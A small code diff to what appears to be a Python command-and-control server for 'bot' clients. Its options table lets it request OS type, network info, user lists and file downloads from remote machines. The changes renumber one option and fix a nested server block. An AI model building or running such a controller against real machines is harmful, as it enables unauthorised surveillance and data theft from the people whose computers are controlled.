@@ -15,7 +15,7 @@ __response_options = {"1": "OS-TYPE",
                       "6": "IO-CONNECTED",
                       "7": "NETWORK-INFO",
                       "8": "USERS",
-                      "15": "DOWNLOAD-FILE"}
+                      "9": "DOWNLOAD-FILE"}
 
 __headers_type = {"1": b"<Send-File>", "2": b"<File-Name>", "3": b"<Print-to-Output>"}
 
@@ -72,5 +72,5 @@ async def run_server(hostname: str, port: int) -> None:
     server = await asyncio.start_server(handle_bot_client, hostname, port)
 
     async with server:
-        async with server:
-            await server.serve_forever()
+        # async with server:
+        await server.serve_forever()
